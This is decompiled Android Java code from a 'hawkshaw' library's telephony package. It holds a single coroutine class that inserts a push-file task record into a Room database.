package com.hawkshaw.library.features.telephony;

import W2.y;
import Y1.C0110h;
import a3.e;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity;
import i3.p;
import t3.E;

public final class g extends C0331i implements p {

    /* renamed from: D  reason: collision with root package name */
    public int f5035D;

    /* renamed from: E  reason: collision with root package name */
    public final /* synthetic */ PushFileTaskEntity f5036E;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public g(PushFileTaskEntity pushFileTaskEntity, e eVar) {
        super(2, eVar);
        this.f5036E = pushFileTaskEntity;
    }

    public final e create(Object obj, e eVar) {
        return new g(this.f5036E, eVar);
    }

    public final Object invoke(Object obj, Object obj2) {
        return ((g) create((E) obj, (e) obj2)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f5035D;
        if (i5 == 0) {
            C0110h.P(obj);
            this.f5035D = 1;
            if (AppDatabaseKt.getDb().pushFileTaskDao().insert(new PushFileTaskEntity[]{this.f5036E}, this) == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            C0110h.P(obj);
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return y.f2418a;
    }
}
